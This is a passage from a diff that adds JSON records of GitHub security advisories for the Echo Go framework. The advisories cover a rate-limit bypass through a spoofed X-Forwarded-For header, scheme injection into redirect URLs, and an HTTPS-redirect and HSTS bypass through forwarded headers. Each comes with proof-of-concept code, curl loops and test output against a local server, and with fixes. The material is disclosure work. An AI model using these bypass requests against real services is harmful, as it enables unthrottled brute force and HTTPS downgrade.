freely injectable without comment or mitigation.\n\n### Full execution chain\n\n1. Server starts with `echo.New()` (no `IPExtractor` set) and `e.GET(\"/limited\", h, middleware.RateLimiter(store))`\n2. Attacker sends `GET /limited` with header `X-Forwarded-For: 1.2.3.4` — rate bucket for `1.2.3.4` consumed\n3. Attacker sends `GET /limited` again with `X-Forwarded-For: 1.2.3.4` — second token consumed; if burst is 1, next request would be 429\n4. Attacker sends `GET /limited` with `X-Forwarded-For: 5.6.7.8` — **new bucket created** for `5.6.7.8`, 200 OK returned\n5. Attacker repeats step 4 with arbitrary IPs — rate limit never triggers; unlimited requests served\n\n## Proof of Concept\n\n```go\npackage main\n\nimport (\n    \"net/http\"\n    echo \"github.com/labstack/echo/v5\"\n    \"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc main() {\n    e := echo.New()\n    // NOTE: IPExtractor deliberately NOT set — this is the default\n    store := middleware.NewRateLimiterMemoryStore(1)\n    e.GET(\"/limited\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"ok\")\n    }, middleware.RateLimiter(store))\n    e.Logger.Fatal(e.Start(\":1324\"))\n}\n```\n\n```bash\n# First request with IP 1.1.1.1 — consumes burst token\ncurl -i -H 'X-Forwarded-For: 1.1.1.1' http://127.0.0.1:1324/limited\n# HTTP/1.1 200 OK\n\n# Second request with same IP — rate limited\ncurl -i -H 'X-Forwarded-For: 1.1.1.1' http://127.0.0.1:1324/limited\n# HTTP/1.1 429 Too Many Requests\n\n# Third request with DIFFERENT spoofed IP — bypass: new bucket, 200 OK\ncurl -i -H 'X-Forwarded-For: 2.2.2.2' http://127.0.0.1:1324/limited\n# HTTP/1.1 200 OK\n\n# Repeat indefinitely with rotating IPs — rate limit never triggers\nfor i in $(seq 1 100); do\n  curl -s -o /dev/null -w \"%{http_code}\\n\" -H \"X-Forwarded-For: 10.0.0.$i\" http://127.0.0.1:1324/limited\ndone\n# 200 200 200 ... (all 200, never 429)\n```\n\n## Impact\n\n- Attackers can make unlimited requests to any endpoint protected by `middleware.RateLimiter()` using the default configuration by rotating the `X-Forwarded-For` header\n- Brute-force attacks against login, password reset, 2FA, and similar authentication endpoints are unthrottled\n- API abuse and credential stuffing are possible at arbitrary throughput\n- Any per-IP security control that relies on `ctx.RealIP()` with default configuration (access logging, geo-blocking, audit trails) is equally undermined\n\n## Recommended Remediation\n\n### Option 1: Require explicit `IPExtractor` configuration in `RateLimiter()` (preferred)\n\nThe `RateLimiter()` convenience function should detect when `IPExtractor` is not configured and either panic with a clear message or fall back to `ExtractIPDirect()` (direct-connection IP only):\n\n```go\n// rate_limiter.go — illustrative change\nvar DefaultRateLimiterConfig = RateLimiterConfig{\n    Skipper: DefaultSkipper,\n    IdentifierExtractor: func(ctx *echo.Context) (string, error) {\n        if ctx.Echo().IPExtractor == nil {\n            // Fall back to direct TCP peer address — safe for non-proxied deployments\n            host, _, err := net.SplitHostPort(ctx.Request().RemoteAddr)\n            if err != nil {\n                return ctx.Request().RemoteAddr, nil\n            }\n            return host, nil\n        }\n        return ctx.RealIP(), nil\n    },\n    ...\n}\n```\n\n### Option 2: Document and warn in `RateLimiter()` godoc\n\nAt minimum, add a prominent warning to the `RateLimiter()` and `DefaultRateLimiterConfig` documentation directing users to configure `Echo#IPExtractor` before using IP-based rate limiting, mirroring the guidance already present in `ip.go`.\n\n```go\n// RateLimiter returns a rate limiting middleware.\n//\n// SECURITY: The default IdentifierExtractor uses ctx.RealIP(), which reads\n// X-Forwarded-For / X-Real-IP headers. Without setting Echo#IPExtractor,\n// these headers are fully client-controlled and can be spoofed to bypass\n// rate limiting. Set e.IPExtractor = echo.ExtractIPDirect() (no proxy) or\n// echo.ExtractIPFromXFFHeader() (trusted proxy) before using this middleware.\n// See https://echo.labstack.com/guide/ip-address for details.\nfunc RateLimiter(store RateLimiterStore) echo.MiddlewareFunc {\n```\n\n## Credit\n\nThis vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.1.0: without `Echo#IPExtractor`, `Context.RealIP()` returns the address of the direct peer; the previous behavior is available as `LegacyIPExtractor`.\n\n`github.com/labstack/echo/v4` keeps its default for compatibility.\n\n## Workarounds\n\nConfigure `Echo#IPExtractor` for your deployment (`echo.ExtractIPDirect()` without a proxy, `echo.ExtractIPFromXFFHeader()` behind proxies, with `TrustIPRange` for proxies on public addresses), or set `RateLimiterConfig.IdentifierExtractor` to an identifier that clients cannot choose.\n",
+      "ghsa_id": "GHSA-246p-cpwv-v3jq",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-246p-cpwv-v3jq",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-246p-cpwv-v3jq"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-27T23:04:04Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Rate Limiter Bypass via Spoofed X-Forwarded-For Header in Default Configuration",
+      "updated_at": "2026-09-27T23:04:04Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-246p-cpwv-v3jq",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.1.0"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": null,
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 1,
+      "created_at": null,
+      "credits": [],
+      "credits_detailed": [],
+      "cve_id": null,
+      "cvss": {
+        "score": 4.7,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 4.7,
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-601"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-601",
+          "name": "URL Redirection to Untrusted Site ('Open Redirect')"
+        }
+      ],
+      "description": "## Summary\n\nThe `c.Scheme()` method in Echo (`context.go:162-181`) trusts the `X-Forwarded-Proto`, `X-Forwarded-Protocol`, and `X-Url-Scheme` request headers without validating that the value is `http` or `https`. The `WWWRedirect()` and `NonWWWRedirect()` middlewares use this unsanitized scheme to construct redirect URLs, allowing an attacker to inject arbitrary URI schemes into the `Location` response header.\n\n## Affected Components\n\n- `context.go:162-181` - `Scheme()` method returns attacker-controlled value verbatim\n- `middleware/redirect.go:172-184` - `redirectWWW`/`redirectNonWWW` use unsanitized scheme\n\n## Proof of Concept\n\n```\nGET /path HTTP/1.1\nHost: example.com\nX-Forwarded-Proto: javascript\n\nResponse:\nHTTP/1.1 301 Moved Permanently\nLocation: javascript://www.example.com/path\n```\n\nConfirmed injectable schemes: `javascript`, `data`, `vbscript`, `file`, `ftp`, `ssh`, `telnet`, `gopher`.\n\nOnly `WWWRedirect()` and `NonWWWRedirect()` (and `WithConfig` variants) are affected. `HTTPSRedirect`, `HTTPSWWWRedirect`, `HTTPSNonWWWRedirect` are NOT affected (they hardcode `https://`).\n\n## Impact\n\n- Open redirect to arbitrary scheme URLs when app is not behind a proxy that strips `X-Forwarded-Proto`\n- Cache poisoning when behind a CDN that caches redirect responses keyed by path\n- `file://` scheme injection could trigger file access in some browser configurations\n\n## Suggested Fix\n\nWhitelist scheme in `c.Scheme()` to only return `http` or `https`:\n\n```go\nfunc (c *Context) Scheme() string {\n    if c.IsTLS() {\n        return \"https\"\n    }\n    if scheme := c.request.Header.Get(HeaderXForwardedProto); scheme != \"\" {\n        scheme = strings.ToLower(strings.TrimSpace(scheme))\n        if scheme == \"https\" {\n            return \"https\"\n        }\n    }\n    return \"http\"\n}\n```\n\n## Disclosure\n\nSource code review, manually verified with actual HTTP server. Tested on Echo v5.0.4 (latest master).\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.1.1 and `github.com/labstack/echo/v4` v4.15.2. `Context.Scheme()` now accepts only `http`, `https`, `ws` or `wss` from the `X-Forwarded-Proto`, `X-Forwarded-Protocol` and `X-Url-Scheme` headers, and falls back to `http` for any other value (#2953).\n\n## Workarounds\n\nUpgrade to a patched version. If you cannot upgrade, have your edge proxy overwrite or remove the `X-Forwarded-Proto`, `X-Forwarded-Protocol` and `X-Url-Scheme` request headers.\n",
+      "ghsa_id": "GHSA-23wf-92cp-8pcj",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-23wf-92cp-8pcj",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-23wf-92cp-8pcj"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-27T18:47:40Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Arbitrary Scheme Injection in WWWRedirect/NonWWWRedirect Middlewares via X-Forwarded-Proto",
+      "updated_at": "2026-09-27T18:47:40Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-23wf-92cp-8pcj",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.1.1",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.1.1"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": "4.15.2",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 4.15.2"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 0,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "sergeykochanov",
+          "type": "reporter"
+        },
+        {
+          "login": "bugbunny-research",
+          "type": "finder"
+        },
+        {
+          "login": "lalalala5678",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/47022537?v=4",
+            "events_url": "https://api.github.com/users/sergeykochanov/events{/privacy}",
+            "followers_url": "https://api.github.com/users/sergeykochanov/followers",
+            "following_url": "https://api.github.com/users/sergeykochanov/following{/other_user}",
+            "gists_url": "https://api.github.com/users/sergeykochanov/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/sergeykochanov",
+            "id": 47022537,
+            "login": "sergeykochanov",
+            "node_id": "MDQ6VXNlcjQ3MDIyNTM3",
+            "organizations_url": "https://api.github.com/users/sergeykochanov/orgs",
+            "received_events_url": "https://api.github.com/users/sergeykochanov/received_events",
+            "repos_url": "https://api.github.com/users/sergeykochanov/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/sergeykochanov/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/sergeykochanov/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/sergeykochanov",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/262839898?v=4",
+            "events_url": "https://api.github.com/users/bugbunny-research/events{/privacy}",
+            "followers_url": "https://api.github.com/users/bugbunny-research/followers",
+            "following_url": "https://api.github.com/users/bugbunny-research/following{/other_user}",
+            "gists_url": "https://api.github.com/users/bugbunny-research/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/bugbunny-research",
+            "id": 262839898,
+            "login": "bugbunny-research",
+            "node_id": "U_kgDOD6qeWg",
+            "organizations_url": "https://api.github.com/users/bugbunny-research/orgs",
+            "received_events_url": "https://api.github.com/users/bugbunny-research/received_events",
+            "repos_url": "https://api.github.com/users/bugbunny-research/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/bugbunny-research/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/bugbunny-research/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/bugbunny-research",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/121565756?v=4",
+            "events_url": "https://api.github.com/users/lalalala5678/events{/privacy}",
+            "followers_url": "https://api.github.com/users/lalalala5678/followers",
+            "following_url": "https://api.github.com/users/lalalala5678/following{/other_user}",
+            "gists_url": "https://api.github.com/users/lalalala5678/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/lalalala5678",
+            "id": 121565756,
+            "login": "lalalala5678",
+            "node_id": "U_kgDOBz7yPA",
+            "organizations_url": "https://api.github.com/users/lalalala5678/orgs",
+            "received_events_url": "https://api.github.com/users/lalalala5678/received_events",
+            "repos_url": "https://api.github.com/users/lalalala5678/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/lalalala5678/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/lalalala5678/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/lalalala5678",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": null,
+      "cvss": {
+        "score": 5.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.9,
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-346"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-346",
+          "name": "Origin Validation Error"
+        }
+      ],
+      "description": "## Description\n\n`Context.Scheme()` unconditionally trusts four client-controlled HTTP headers to determine the request scheme, with no mechanism to configure trusted sources. This allows a remote unauthenticated attacker to bypass HTTPS redirect enforcement and suppress HSTS headers.\n\nThe trusted headers (checked in this order of precedence):\n1. `X-Forwarded-Proto`\n2. `X-Forwarded-Protocol`\n3. `X-Forwarded-Ssl`\n4. `X-Url-Scheme`\n\n### Threat model\n\n**Scenario A — Directly exposed application (vulnerable by default):**\nThe Echo application listens on HTTP and is reachable directly by clients (no L7 proxy in front), or an attacker can bypass the proxy and reach the backend directly. In this case, the attacker has full control over all request headers. Sending `X-Forwarded-Proto: https` defeats the `HTTPSRedirect` middleware entirely — traffic stays on plaintext HTTP, enabling man-in-the-middle attacks.\n\nThis is the primary scenario. The application is vulnerable by default with no misconfiguration required — simply using `e.Pre(middleware.HTTPSRedirect())` as documented is sufficient.\n\n**Scenario B — Behind L7 proxy with header sanitization (reduced risk):**\nIf the application is strictly behind a correctly configured L7 proxy that always overwrites `X-Forwarded-Proto` and there is no direct access to the backend, the practical risk is lower. However, this relies on perimeter controls external to the framework, not on the framework itself. As Echo's own IP-extraction documentation states: *\"you must not trust HTTP headers unconditionally.\"*\n\n### Root cause\n\n`context.go`, lines 161–181:\n\n```go\nfunc (c *Context) Scheme() string {\n    if c.IsTLS() {\n        return \"https\"\n    }\n    if scheme := c.request.Header.Get(HeaderXForwardedProto); scheme != \"\" {\n        return scheme\n    }\n    if scheme := c.request.Header.Get(HeaderXForwardedProtocol); scheme != \"\" {\n        return scheme\n    }\n    if ssl := c.request.Header.Get(HeaderXForwardedSsl); ssl == \"on\" {\n        return \"https\"\n    }\n    if scheme := c.request.Header.Get(HeaderXUrlScheme); scheme != \"\" {\n        return scheme\n    }\n    return \"http\"\n}\n```\n\nTwo additional issues with this implementation:\n\n1. **No value validation.** `Scheme()` returns any arbitrary string from the header, not just `\"http\"` or `\"https\"`. This breaks the documented contract (\"returns the HTTP protocol scheme, `http` or `https`\") and causes unexpected behavior in middleware that uses the return value to construct URLs (e.g., `WWWRedirect` builds `scheme + \"://www.\" + host + uri`).\n\n2. **Consumed by security-critical middleware.** The return value is used directly by redirect middleware (`middleware/redirect.go:136`) and secure middleware (`middleware/secure.go:125`) for security enforcement decisions.\n\n### Affected components\n\n| Component | File | Line(s) | Impact |\n|-----------|------|---------|--------|\n| `Context.Scheme()` | `context.go` | 161–181 | Returns attacker-controlled scheme |\n| `HTTPSRedirect` | `middleware/redirect.go` | 147–151 | HTTPS enforcement bypassed |\n| `HTTPSWWWRedirect` | `middleware/redirect.go` | 154–161 | HTTPS enforcement bypassed |\n| `HTTPSNonWWWRedirect` | `middleware/redirect.go` | 163–170 | HTTPS enforcement bypassed |\n| `WWWRedirect` | `middleware/redirect.go` | 172–177 | URL constructed with arbitrary scheme |\n| `NonWWWRedirect` | `middleware/redirect.go` | 179–184 | URL constructed with arbitrary scheme |\n| Secure middleware (HSTS) | `middleware/secure.go` | 125 | HSTS header suppressed |\n\n### This is an unsafe-by-default API surface, not just misconfiguration\n\nThis behavior is not accidental — it is codified in the project's own test suite. For example, `middleware/redirect_test.go` (lines 29–34) explicitly asserts that `X-Forwarded-Proto: https` on an HTTP request results in 200 OK (no redirect):\n\n```go\n{\n    whenHost:         \"labstack.com\",\n    whenHeader:       map[string][]string{echo.HeaderXForwardedProto: {\"https\"}},\n    expectLocation:   \"\",\n    expectStatusCode: http.StatusOK,\n},\n```\n\nSimilarly, `middleware/secure_test.go` (lines 42–53) and `context_test.go` (lines 1104–1111) assert that scheme is derived from the header.\n\nThe problem is not that the framework *can* use forwarded headers — that is legitimate behind a trusted proxy. The problem is that **there is no mechanism to control whether this trust is appropriate**, unlike the existing IP header trust model. `Scheme()` always trusts the headers, making any middleware that depends on it unsafe-by-default.\n\n### Inconsistency with existing trust model\n\nEcho already recognizes this class of header-trust vulnerability for IP addresses. The `IPExtractor` mechanism with `TrustOption` (`TrustLoopback`, `TrustPrivateNet`, `TrustLinkLocal`, `TrustIPRange`) was introduced specifically because:\n\n> *\"you must not trust HTTP headers unconditionally. Otherwise, you might give someone a chance of deceiving you. **A security risk!**\"*\n> — `ip.go`, lines 20–21\n\n> *\"If you put no proxy (e.g., directly facing the internet), all you need to (and have to) see is IP address from network layer. Any HTTP header is untrustable because the clients have full control what headers to be set.\"*\n> — `ip.go`, lines 36–38\n\nNo equivalent mechanism exists for scheme detection. `Scheme()` unconditionally trusts all four forwarded headers with no configuration, opt-in, or documentation warning.\n\n### Note on proxies and the \"3 additional headers\"\n\nA correctly configured nginx `proxy_set_header X-Forwarded-Proto $scheme;` overwrites `X-Forwarded-Proto` with the actual incoming scheme. When a proxy does this, `X-Forwarded-Proto` is trustworthy and the three fallback headers (`X-Forwarded-Protocol`, `X-Forwarded-Ssl`, `X-Url-Scheme`) are never reached because `X-Forwarded-Proto` takes precedence in `Scheme()`.\n\nThe three additional headers become real attack vectors specifically when:\n- The proxy does **not** set `X-Forwarded-Proto` at all (common in default proxy configs), or\n- The application is directly exposed (Scenario A above).\n\nIn such cases, an attacker can bypass via any of the four headers. The main vulnerability (HTTPS redirect bypass via `X-Forwarded-Proto` on a directly exposed app) does not depend on the additional headers.\n\n## Impact\n\n**HTTPS downgrade / MITM:** An attacker who can reach the Echo HTTP endpoint directly can prevent HTTPS redirection, keeping client traffic on plaintext HTTP and enabling man-in-the-middle attacks.\n\n**HSTS suppression:** Behind a TLS-terminating proxy, spoofing `X-Forwarded-Proto: http` prevents the `Strict-Transport-Security` header from being sent. When the response ultimately reaches the client over HTTPS (via the proxy), the missing HSTS header weakens browser-side HTTPS enforcement. Note: browsers ignore HSTS received over plain HTTP, so the practical risk is specifically in the suppression scenario behind a TLS-terminating proxy, not in injecting HSTS on HTTP.\n\n**URL construction with arbitrary scheme:** `WWWRedirect` and `NonWWWRedirect` use `c.Scheme()` to build redirect URLs (`scheme + \"://www.\" + host + uri`). An attacker can inject arbitrary strings (e.g., `javascript:`, `data:`) as the scheme component of redirect URLs.\n\n## Proof of Concept\n\nTested on Echo **v5.0.4** (commit `fa5311b`, 2026-02-15).\n\n### PoC 1: HTTPS Redirect Bypass (Go test)\n\n```go\npackage echo_test\n\nimport (\n    \"net/http\"\n    \"net/http/httptest\"\n    \"testing\"\n\n    \"github.com/labstack/echo/v5\"\n    \"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc TestHTTPSRedirectBypass(t *testing.T) {\n    e := echo.New()\n    e.Pre(middleware.HTTPSRedirect())\n    e.GET(\"/\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"served over: \"+c.Scheme())\n    })\n\n    // Normal HTTP → should redirect\n    req := httptest.NewRequest(http.MethodGet, \"/\", nil)\n    rec := httptest.NewRecorder()\n    e.ServeHTTP(rec, req)\n    if rec.Code != http.StatusMovedPermanently {\n        t.Fatalf(\"expected 301, got %d\", rec.Code)\n    }\n    t.Logf(\"Normal HTTP → %d (redirect to %s)\", rec.Code, rec.Header().Get(\"Location\"))\n\n    // Attack: all 4 headers bypass the redirect\n    headers := map[string]string{\n        \"X-Forwarded-Proto\":    \"https\",\n        \"X-Forwarded-Protocol\": \"https\",\n        \"X-Forwarded-Ssl\":      \"on\",\n        \"X-Url-Scheme\":         \"https\",\n    }\n    for name, value := range headers {\n        req := httptest.NewRequest(http.MethodGet, \"/\", nil)\n        req.Header.Set(name, value)\n        rec := httptest.NewRecorder()\n        e.ServeHTTP(rec, req)\n        if rec.Code == http.StatusOK {\n            t.Errorf(\"BYPASS via %s: %s → %d (no redirect!)\", name, value, rec.Code)\n        }\n    }\n}\n```\n\n### PoC 2: curl examples (easiest to reproduce)\n\nStart a minimal Echo server:\n\n```go\npackage main\n\nimport (\n    \"net/http\"\n    \"github.com/labstack/echo/v5\"\n    \"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc main() {\n    e := echo.New()\n    e.Pre(middleware.HTTPSRedirect())\n    e.GET(\"/\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"Hello on \"+c.Scheme())\n    })\n    e.Start(\":8080\")\n}\n```\n\nThen:\n\n```bash\n# Normal HTTP → 301 redirect (expected)\n$ curl -I http://localhost:8080/\nHTTP/1.1 301 Moved Permanently\nLocation: https://localhost:8080/\n\n# Attack: bypass via X-Forwarded-Proto\n$ curl -H \"X-Forwarded-Proto: https\" http://localhost:8080/\nHello on https\n\n# Attack: bypass via X-Forwarded-Protocol\n$ curl -H \"X-Forwarded-Protocol: https\" http://localhost:8080/\nHello on https\n\n# Attack: bypass via X-Forwarded-Ssl\n$ curl -H \"X-Forwarded-Ssl: on\" http://localhost:8080/\nHello on https\n\n# Attack: bypass via X-Url-Scheme\n$ curl -H \"X-Url-Scheme: https\" http://localhost:8080/\nHello on https\n```\n\n### PoC 3: Arbitrary scheme in redirect URL (WWWRedirect)\n\n```go\nfunc TestArbitrarySchemeInRedirect(t *testing.T) {\n    e := echo.New()\n    e.Pre(middleware.WWWRedirect())\n    e.GET(\"/\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"ok\")\n    })\n\n    req := httptest.NewRequest(http.MethodGet, \"/\", nil)\n    req.Host = \"example.com\"\n    req.Header.Set(\"X-Forwarded-Proto\", \"javascript\")\n    rec := httptest.NewRecorder()\n    e.ServeHTTP(rec, req)\n\n    // Redirect Location uses the spoofed scheme\n    loc := rec.Header().Get(\"Location\")\n    // loc == \"javascript://www.example.com/\" — violates http/https contract\n    t.Logf(\"Status: %d, Location: %s\", rec.Code, loc)\n}\n```\n\n### PoC 4: HSTS Suppression\n\n```go\nfunc TestHSTSSuppression(t *testing.T) {\n    e := echo.New()\n    e.Use(middleware.SecureWithConfig(middleware.SecureConfig{HSTSMaxAge: 31536000}))\n    e.GET(\"/\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"ok\")\n    })\n\n    // Legitimate: proxied HTTPS should have HSTS\n    req := httptest.NewRequest(http.MethodGet, \"/\", nil)\n    req.Header.Set(\"X-Forwarded-Proto\", \"https\")\n    rec := httptest.NewRecorder()\n    e.ServeHTTP(rec, req)\n    if h := rec.Header().Get(\"Strict-Transport-Security\"); h == \"\" {\n        t.Fatal(\"HSTS missing when it should be present\")\n    }\n\n    // Attack: suppress HSTS by spoofing \"http\"\n    // In production: app behind TLS-terminating proxy, proxy delivers response\n    // to client over HTTPS, but HSTS header is absent due to spoofed header\n    req2 := httptest.NewRequest(http.MethodGet, \"/\", nil)\n    req2.Header.Set(\"X-Forwarded-Proto\", \"http\")\n    rec2 := httptest.NewRecorder()\n    e.ServeHTTP(rec2, req2)\n    if h := rec2.Header().Get(\"Strict-Transport-Security\"); h == \"\" {\n        t.Error(\"VULNERABLE: HSTS suppressed via X-Forwarded-Proto: http\")\n    }\n}\n```\n\n### Test output (all attacks succeed)\n\n```\n=== RUN   TestHTTPSRedirectBypass\n    Normal HTTP → 301 (redirect to https://example.com/)\n    BYPASS via X-Forwarded-Proto: https → 200 (no redirect!)\n    BYPASS via X-Forwarded-Protocol: https → 200 (no redirect!)\n    BYPASS via X-Forwarded-Ssl: on → 200 (no redirect!)\n    BYPASS via X-Url-Scheme: https → 200 (no redirect!)\n\n=== RUN   TestArbitrarySchemeInRedirect\n    Status: 301, Location: javascript://www.example.com/\n\n=== RUN   TestHSTSSuppression\n    VULNERABLE: HSTS suppressed via X-Forwarded-Proto: http\n```\n\n## Precedent CVEs\n\n- **CVE-2018-1193** — Cloud Foundry GoRouter: unverified `X-Forwarded-Proto` header trusted for scheme, enabling HTTPS enforcement bypass. Fixed by adding `sanitize_forwarded_proto` option.\n- **CVE-2025-41235** — Spring Cloud Gateway: trusting forwarded headers without explicit proxy configuration, enabling HTTPS redirect bypass. Fixed by requiring trusted proxy configuration.\n\n## Suggested fix\n\n### Option A: `SchemeExtractor` (recommended, backward-compatible with opt-in)\n\nAdd a `SchemeExtractor` mechanism analogous to the existing `IPExtractor`, where the extractor decides whether to trust forwarded headers based on `RemoteAddr` or trusted proxy ranges:\n\n```go\ntype SchemeExtractor func(req *http.Request) string\n\n// ExtractSchemeDirect ignores all forwarded headers (secure default)\nfunc ExtractSchemeDirect() SchemeExtractor { ... }\n\n// ExtractSchemeFromXFFHeader trusts X-Forwarded-Proto from trusted sources\nfunc ExtractSchemeFromXFFHeader(options ...TrustOption) SchemeExtractor { ... }\n```\n\nUsage:\n\n```go\n// Secure: directly exposed, ignore headers\ne.SchemeExtractor = echo.ExtractSchemeDirect()\n\n// Behind trusted proxy\ne.SchemeExtractor = echo.ExtractSchemeFromXFFHeader(\n    echo.TrustIPRange(proxySubnet),\n)\n```\n\nThe default should be secure. For backward compatibility, a migration period with deprecation warnings for the legacy behavior may be appropriate.\n\n### Option B: Minimal hardening (does NOT fix the bypass, but fixes the contract violation)\n\n`Scheme()` should validate that the returned value is `\"http\"` or `\"https\"`, rejecting arbitrary strings. This prevents the \"arbitrary scheme in redirect URL\" issue but does not address the core HTTPS redirect bypass (because `\"https\"` is a valid value that the attacker injects).\n\n### Both options should be applied together.\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. `Context.Scheme()` now uses the `X-Forwarded-Proto`, `X-Forwarded-Protocol`, `X-Forwarded-Ssl` and `X-Url-Scheme` headers only when the request comes directly from a loopback, link-local or private network address or a unix socket. When `X-Forwarded-Proto` is present, only its last value is used. The new `Echo#SchemeExtractor` selects the strategy (`ExtractSchemeFromHeaders`, `ExtractSchemeDirect`, `LegacySchemeExtractor`). The Secure middleware sets HSTS from `Context.Scheme()`, and the Proxy middleware always sets `X-Forwarded-Proto` and removes the other scheme headers.\n\n## Workarounds\n\nIf a proxy or load balancer connects to your application from a public address, trust its address ranges after upgrading, for example `e.SchemeExtractor = 